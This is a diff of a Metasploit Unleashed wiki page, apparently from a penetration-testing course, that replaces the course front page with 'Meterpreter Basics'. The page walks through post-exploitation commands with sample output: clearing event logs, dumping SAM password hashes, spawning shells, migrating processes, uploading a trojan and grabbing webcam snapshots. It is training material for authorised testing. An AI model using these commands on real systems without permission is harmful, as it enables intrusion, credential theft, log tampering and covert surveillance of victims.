@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Meterpreter Basics - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Meterpreter_Basics" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Meterpreter_Basics&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Meterpreter_Basics&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Meterpreter_Basics&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,643 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Meterpreter Basics</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Meterpreter_Basics#column-one">navigation</a>, <a href="Meterpreter_Basics#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Since the Meterpreter provides a whole new environment, we will cover some of the basic Meterpreter commands to get you started and help you get familiar with this most powerful tool. Throughout this course, almost every available Meterpreter command is covered. For those that aren't covered, experimentation is the key to successful learning.
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Meterpreter_Basics#help"><span class="tocnumber">1</span> <span class="toctext">help</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Meterpreter_Basics#background"><span class="tocnumber">2</span> <span class="toctext">background</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="Meterpreter_Basics#cat"><span class="tocnumber">3</span> <span class="toctext">cat</span></a></li>
+<li class="toclevel-1 tocsection-4"><a href="Meterpreter_Basics#cd_.26_pwd"><span class="tocnumber">4</span> <span class="toctext">cd &amp; pwd</span></a></li>
+<li class="toclevel-1 tocsection-5"><a href="Meterpreter_Basics#clearev"><span class="tocnumber">5</span> <span class="toctext">clearev</span></a></li>
+<li class="toclevel-1 tocsection-6"><a href="Meterpreter_Basics#download"><span class="tocnumber">6</span> <span class="toctext">download</span></a></li>
+<li class="toclevel-1 tocsection-7"><a href="Meterpreter_Basics#edit"><span class="tocnumber">7</span> <span class="toctext">edit</span></a></li>
+<li class="toclevel-1 tocsection-8"><a href="Meterpreter_Basics#execute"><span class="tocnumber">8</span> <span class="toctext">execute</span></a></li>
+<li class="toclevel-1 tocsection-9"><a href="Meterpreter_Basics#getuid"><span class="tocnumber">9</span> <span class="toctext">getuid</span></a></li>
+<li class="toclevel-1 tocsection-10"><a href="Meterpreter_Basics#hashdump"><span class="tocnumber">10</span> <span class="toctext">hashdump</span></a></li>
+<li class="toclevel-1 tocsection-11"><a href="Meterpreter_Basics#idletime"><span class="tocnumber">11</span> <span class="toctext">idletime</span></a></li>
+<li class="toclevel-1 tocsection-12"><a href="Meterpreter_Basics#ipconfig"><span class="tocnumber">12</span> <span class="toctext">ipconfig</span></a></li>
+<li class="toclevel-1 tocsection-13"><a href="Meterpreter_Basics#lpwd_.26_lcd"><span class="tocnumber">13</span> <span class="toctext">lpwd &amp; lcd</span></a></li>
+<li class="toclevel-1 tocsection-14"><a href="Meterpreter_Basics#ls"><span class="tocnumber">14</span> <span class="toctext">ls</span></a></li>
+<li class="toclevel-1 tocsection-15"><a href="Meterpreter_Basics#migrate"><span class="tocnumber">15</span> <span class="toctext">migrate</span></a></li>
+<li class="toclevel-1 tocsection-16"><a href="Meterpreter_Basics#ps"><span class="tocnumber">16</span> <span class="toctext">ps</span></a></li>
+<li class="toclevel-1 tocsection-17"><a href="Meterpreter_Basics#resource"><span class="tocnumber">17</span> <span class="toctext">resource</span></a></li>
+<li class="toclevel-1 tocsection-18"><a href="Meterpreter_Basics#search"><span class="tocnumber">18</span> <span class="toctext">search</span></a></li>
+<li class="toclevel-1 tocsection-19"><a href="Meterpreter_Basics#shell"><span class="tocnumber">19</span> <span class="toctext">shell</span></a></li>
+<li class="toclevel-1 tocsection-20"><a href="Meterpreter_Basics#upload"><span class="tocnumber">20</span> <span class="toctext">upload</span></a></li>
+<li class="toclevel-1 tocsection-21"><a href="Meterpreter_Basics#webcam_list"><span class="tocnumber">21</span> <span class="toctext">webcam_list</span></a></li>
+<li class="toclevel-1 tocsection-22"><a href="Meterpreter_Basics#webcam_snap"><span class="tocnumber">22</span> <span class="toctext">webcam_snap</span></a></li>
+</ul>
+</td></tr></table>
 <p><br />
+</p>
+<h2> <span class="mw-headline" id="help">help</span></h2>
+<p><br />
+The 'help' command, as may be expected, displays the Meterpreter help menu.
 <br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
 <br />
+<pre><u>meterpreter</u> > <span style='color:#339966;'>help</span>
+
+Core Commands
+=============
+
+    Command       Description
+    -------       -----------
+    ?             Help menu
+    background    Backgrounds the current session
+    channel       Displays information about active channels
+<span style='color:#00ff00;'>...snip...</span></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="background">background</span></h2>
+<p><br />
+The 'background' command will send the current Meterpreter session to the background and return you to the msf prompt. To get back to your Meterpreter session, just interact with it again.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#339966;'>background</span>
+msf exploit(<span style='color:#ff0000;'>ms08_067_netapi</span>) > <span style='color:#339966;'>sessions -i 1</span>
+<span style='color:#333399;'>[*]</span> Starting interaction with 1...
+
+<u>meterpreter</u> ></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="cat">cat</span></h2>
+<p><br />
+The 'cat' command is identical to the command found on *nix systems. It displays the content of a file when it’s given as an argument.
+<pre>
+<u>meterpreter</u> > <span style='color:#339966;'>cat</span>
+Usage: cat file
+
+Example usage:
+<u>meterpreter</u> > <span style='color:#339966;'>cat edit.txt</span>
+What you talkin' about Willis
+
+<u>meterpreter</u> >
+</pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="cd_.26_pwd">cd &amp; pwd</span></h2>
+<p><br />
+The 'cd' &amp; 'pwd' commands are used to change and display current working directly on the target host.<br />
+The change directory “cd” works the same way as it does under DOS and *nix systems.<br />
+By default, the current working folder is where the connection to your listener was initiated.
+<br />
+ARGUMENTS:<br />
+<pre>
+<span style='color:#ff0000;'>cd</span>:	Path of the folder to change to
+<span style='color:#ff0000;'>pwd</span>:	None required
+</pre>
+<br />
+Example usuage:
+<br />
+<pre>
+<u>meterpreter</u> > <span style='color:#339966;'>pwd</span>
+c:\
+<u>meterpreter</u> > <span style='color:#339966;'>cd c:\windows</span>
+<u>meterpreter</u> > <span style='color:#339966;'>pwd</span>
+c:\windows
+<u>meterpreter</u> >
+</pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="clearev">clearev</span></h2>
+<p><br />
+The 'clearev' command will clear the Application, System and Security logs on a Window systems. There are no options or arguments.
+<br /><br />
+Example usage:<br />
+Before<br />
+<a href="File:Clearev_before.png" class="image" title="Center"><img alt="Center" src="http://www.offensive-security.com/w/images/b/b9/Clearev_before.png" width="549" height="275" /></a>
+<br /><br />
+<pre>
+<u>meterpreter</u> > <span style='color:#339966;'>clearev</span>
+<span style='color:#333399;'>[*]</span> Wiping 97 records from Application...
+<span style='color:#333399;'>[*]</span> Wiping 415 records from System...
+<span style='color:#333399;'>[*]</span> Wiping 0 records from Security...
+<u>meterpreter</u> >
+</pre>
+<br />
+After<br />
+<a href="File:Clearev_after.png" class="image" title="Center"><img alt="Center" src="http://www.offensive-security.com/w/images/c/c7/Clearev_after.png" width="542" height="274" /></a>
+<br /><br />
+</p>
+<h2> <span class="mw-headline" id="download">download</span></h2>
+<p><br />
+The 'download' command downloads a file from the remote machine.  Note the use of the double-slashes when giving the Windows path.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#339966;'>download c:\\boot.ini</span>
+<span style='color:#333399;'>[*]</span> downloading: c:\boot.ini -> c:\boot.ini
+<span style='color:#333399;'>[*]</span> downloaded : c:\boot.ini -> c:\boot.ini/boot.ini
+<u>meterpreter</u> ></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="edit">edit</span></h2>
+<p><br />
+The 'edit' command opens a file located on the target host.<br />
+It uses the 'vim' so all the editor's commands are available.<br />
+</p><p>Example usage:<br />
+<pre>
+<u>meterpreter</u> > <span style='color:#339966;'>ls</span>
+
+Listing: C:\Documents and Settings\Administrator\Desktop
+========================================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+.
+<span style='color:#00ff00;'>...snip...</span>
+.
+100666/rw-rw-rw-  0       fil   2012-03-01 13:47:10 -0500  edit.txt
+
+<u>meterpreter</u> > <span style='color:#339966;'>edit edit.txt</span>
+</pre>
+<br />
+</p><p>Please refer to the “vim” editor documentation for more advance use.<br />
+<a rel="nofollow" class="external free" href="http://www.vim.org/">http://www.vim.org/</a>
+<br />
+</p>
+<h2> <span class="mw-headline" id="execute">execute</span></h2>
+<p><br />
+The 'execute' command runs a command on the target.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#339966;'>execute -f cmd.exe -i -H</span>
+Process 38320 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="getuid">getuid</span></h2>
+<p><br />
+Running 'getuid' will display the user that the Meterpreter server is running as on the host.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#339966;'>getuid</span>
+Server username: NT AUTHORITY\SYSTEM
+<u>meterpreter</u> ></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="hashdump">hashdump</span></h2>
+<p><br />
+The 'hashdump' post module will dump the contents of the SAM database.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#339966;'>run post/windows/gather/hashdump</span> 
+
+<span style='color:#333399;'>[*]</span> Obtaining the boot key...
+<span style='color:#333399;'>[*]</span> Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
+<span style='color:#333399;'>[*]</span> Obtaining the user list and keys...
+<span style='color:#333399;'>[*]</span> Decrypting user keys...
+<span style='color:#333399;'>[*]</span> Dumping password hashes...
+
+Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
+dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
+victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
+<u>meterpreter</u> ></pre> 
+<br />
+</p>
+<h2> <span class="mw-headline" id="idletime">idletime</span></h2>
+<p><br />
+Running 'idletime' will display the number of seconds that the user at the remote machine has been idle.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#339966;'>idletime</span>
+User has been idle for: 5 hours 26 mins 35 secs
+<u>meterpreter</u> ></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="ipconfig">ipconfig</span></h2>
+<p><br />
+The 'ipconfig' command displays the network interfaces and addresses on the remote machine.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#339966;'>ipconfig</span>
+
+MS TCP Loopback interface
+Hardware MAC: 00:00:00:00:00:00
+IP Address  : 127.0.0.1
+Netmask     : 255.0.0.0
+
+AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
+Hardware MAC: 00:0c:29:10:f5:15
+IP Address  : 192.168.1.104
+Netmask     : 255.255.0.0
+
+<u>meterpreter</u> ></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="lpwd_.26_lcd">lpwd &amp; lcd</span></h2>
+<p><br />
+The 'lpwd' &amp; 'lcd' commands are used to display and change the local working directory respectively.<br />
+When receiving a meterpreter shell, the local working directory is the location where one started the Metasploit console.<br />
+Changing the working directory will give your meterpreter session access to files located in this folder.
+<br /><br />
+ARGUMENTS:
+<pre>
+<span style='color:#ff0000;'>lpwd</span>:		None required
+<span style='color:#ff0000;'>lcd</span>:		Destination folder
+</pre>
+<br />
+Example usage:
+<pre>
+<u>meterpreter</u> > <span style='color:#339966;'>lpwd</span>
+/root
+
+<u>meterpreter</u> > <span style='color:#339966;'>lcd MSFU</span>
+<u>meterpreter</u> > <span style='color:#339966;'>lpwd</span>
+/root/MSFU
+
+<u>meterpreter</u> > <span style='color:#339966;'>lcd /var/www</span>
+<u>meterpreter</u> > <span style='color:#339966;'>lpwd</span>
+/var/www
+<u>meterpreter</u> >
+</pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="ls">ls</span></h2>
+<p><br />
+As in Linux, the 'ls' command will list the files in the current remote directory.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#339966;'>ls</span>
+
+Listing: C:\Documents and Settings\victim
+=========================================
+
+Mode              Size     Type  Last modified                   Name
+----              ----     ----  -------------                   ----
+40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .
+40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..
+100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel
+40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data
+<span style='color:#00ff00;'>...snip...</span></pre>
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="migrate">migrate</span></h2>
+<p><br />
+Using the 'migrate' post module, you can migrate to another process on the victim.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#339966;'>run post/windows/manage/migrate</span> 
+
+<span style='color:#333399;'>[*]</span> Running module against V-MAC-XP
+<span style='color:#333399;'>[*]</span> Current server process: svchost.exe (1076)
+<span style='color:#333399;'>[*]</span> Migrating to explorer.exe...
+<span style='color:#333399;'>[*]</span> Migrating into process ID 816
+<span style='color:#333399;'>[*]</span> New server process: Explorer.EXE (816)
+<u>meterpreter</u> ></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="ps">ps</span></h2>
+<p><br />
+The 'ps' command displays a list of running processes on the target.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#339966;'>ps</span>
+
+Process list
+============
+
+    PID   Name                  Path
+    ---   ----                  ----
+    132   VMwareUser.exe        C:\Program Files\VMware\VMware Tools\VMwareUser.exe
+    152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe
+    288   snmp.exe              C:\WINDOWS\System32\snmp.exe
+<span style='color:#00ff00;'>...snip...</span></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="resource">resource</span></h2>
+<p><br />
+The 'resource' command will execute meterpreter instructions located inside a text file. Containing one entry per line, “resource” will execute each line in sequence. This can help automate repetitive actions performed by a user.<br /> 
+By default, the commands will run in the current working directory (on target machine) and resource file in the local working directory (the attacking machine).
+<br />
+<br />
+
+<pre>
+<u>meterpreter</u> > <span style='color:#339966;'>resource</span> 
+Usage: resource path1 path2Run the commands stored in the supplied files.
+meterpreter >
+</pre>
+
+</p><p><b>ARGUMENTS:</b><br />
+<pre>
+<span style='color:#ff0000;'>path1</span>:		The location of the file containing the commands to run.
+<span style='color:#ff0000;'>Path2Run</span>:	The location where to run the commands found inside the file
+</pre>
+<br />
+Example usage<br />
+Our file used by resource:<br />
+
+<pre>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#339966;'>cat resourse.txt</span>
+ls
+background
+<span style='color:#ff0000;'>root@kali</span>:~#
+</pre>
+
+<br />
+Running resource command:<br />
+
+<pre>
+<u>meterpreter></u> > <span style='color:#339966;'>resource resourse.txt</span>
+<span style='color:#333399;'>[*]</span> Reading /root/resourse.txt
+<span style='color:#333399;'>[*]</span> Running ls
+
+Listing: C:\Documents and Settings\Administrator\Desktop
+========================================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40777/rwxrwxrwx   0       dir   2012-02-29 16:41:29 -0500  .
+40777/rwxrwxrwx   0       dir   2012-02-02 12:24:40 -0500  ..
+100666/rw-rw-rw-  606     fil   2012-02-15 17:37:48 -0500  IDA Pro Free.lnk
+100777/rwxrwxrwx  681984  fil   2012-02-02 15:09:18 -0500  Sc303.exe
+100666/rw-rw-rw-  608     fil   2012-02-28 19:18:34 -0500  Shortcut to Ability Server.lnk
+100666/rw-rw-rw-  522     fil   2012-02-02 12:33:38 -0500  XAMPP Control Panel.lnk
+
+[*] Running background
+
+[*] Backgrounding session 1...
+msf  exploit(<span style='color:#ff0000;'>handler</span>) >
+
+</pre>
+
+<br />
+</p>
+<h2> <span class="mw-headline" id="search">search</span></h2>
+<p><br />
+The 'search' commands provides a way of locating specific files on the target host. The command is capable of searching through the whole system or specific folders.<br />
+Wildcards can also be used when creating the file pattern to search for.
+<br />
+<pre>
+<u>meterpreter</u> > <span style='color:#339966;'>search</span>
+[-] You must specify a valid file glob to search for, e.g. >search -f *.doc
+</pre>
+<br />
+ARGUMENTS:<br />
+<pre>
+File pattern:	 	May contain wildcards
+Search location:	Optional, if none is given the whole system will be searched.
+</pre>
+<br />
+Example usage:<br />
+<pre>
+<u>meterpreter</u> > <span style='color:#339966;'>search -f autoexec.bat</span>
+Found 1 result...
+    c:\AUTOEXEC.BAT
+<u>meterpreter</u> > <span style='color:#339966;'>search -f sea*.bat c:\\xamp\\</span>
+Found 1 result...
+    c:\\xampp\perl\bin\search.bat (57035 bytes)
+<u>meterpreter</u> >
+</pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="shell">shell</span></h2>
+<p><br />
+The 'shell' command will present you with a standard shell on the target system.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#339966;'>shell</span>
+Process 39640 created.
+Channel 2 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="upload">upload</span></h2>
+<p><br />
+As with the 'download' command, you need to use double-slashes with the 'upload' command.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#339966;'>upload evil_trojan.exe c:\\windows\\system32</span>
+<span style='color:#333399;'>[*]</span> uploading  : evil_trojan.exe -> c:\windows\system32
+<span style='color:#333399;'>[*]</span> uploaded   : evil_trojan.exe -> c:\windows\system32\evil_trojan.exe
+<u>meterpreter</u> ></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="webcam_list">webcam_list</span></h2>
+<p><br />
+The 'webcam_list' command when run from the meterpreter shell, will display currently available web cams on the target host.
+<br />
+Example usage:<br />
+<pre>
+<u>meterpreter</u> > <span style='color:#339966;'>webcam_list</span>
+1: Creative WebCam NX Pro
+2: Creative WebCam NX Pro (VFW)
+<u>meterpreter</u> >
+</pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="webcam_snap">webcam_snap</span></h2>
+<p><br />
+The “webcam_snap” command grabs a picture from a connected web cam on the target system, and saves it to disc as a JPEG image. By default, the save location is the local current working directory with a randomized filename.<br />
+<pre>
+<u>meterpreter</u> > <span style='color:#339966;'>webcam_snap -h</span>
+Usage: webcam_snap [options]
+Grab a frame from the specified webcam.
+
+OPTIONS:
+
+    -h      Help Banner
+    -i &lt;opt>  The index of the webcam to use (Default: 1)
+    -p &lt;opt>  The JPEG image path (Default: 'gnFjTnzi.jpeg')
+    -q &lt;opt>  The JPEG image quality (Default: '50')
+    -v &lt;opt>  Automatically view the JPEG image (Default: 'true')
+
+<u>meterpreter</u> >
+</pre>
+<br />
+OPTIONS:<br />
+<pre>
+-h:	Displays the help information for the command
+-i opt:	If more then 1 web cam is connected, use this option to select the device to capture the
+        image from
+-p opt:	Change path and filename of the image to be saved
+-q opt:	The imagine quality, 50 being the default/medium setting, 100 being best quality
+-v opt:	By default the value is true, which opens the image after capture.
+</pre>
+<br />
+</p><p>Example usage:<br />
+<pre>
+<u>meterpreter</u> > <span style='color:#339966;'>webcam_snap -i 1 -v false</span>
+<span style='color:#333399;'>[*]</span> Starting...
+<span style='color:#339966;'>[+]</span> Got frame
+<span style='color:#333399;'>[*]</span> Stopped
+Webcam shot saved to: /root/yFMaalLB.jpeg
+<u>meterpreter</u> >
+</pre>
+<br />
+<a href="File:Webcam_snap.png" class="image" title="Center"><img alt="Center" src="http://www.offensive-security.com/w/images/a/a8/Webcam_snap.png" width="569" height="491" /></a>
+<br /><br />
+<br />
+</p>
+<hr />
+<p><br />
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="Metasploit_Fundamentals" title="Metasploit Fundamentals">Metasploit Fundamentals</a> &gt; <a href="About_Meterpreter" title="About Meterpreter">About Meterpreter</a> &gt; Meterpreter Basics</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><strong class="selflink">Meterpreter Basics</strong></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 888/1000000
+Preprocessor generated node count: 3385/1000000
+Post‐expand include size: 3828/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:97-0!*!0!!en!2!* and timestamp 20131124000822 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Meterpreter_Basics&amp;oldid=1537">http://www.offensive-security.com/w/index.php?title=Meterpreter_Basics&amp;oldid=1537</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:About_Meterpreter&amp;action=edit&amp;redlink=1" class="new" title="Category:About Meterpreter (page does not exist)">About Meterpreter</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +1128,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.169 secs. --></body></html>
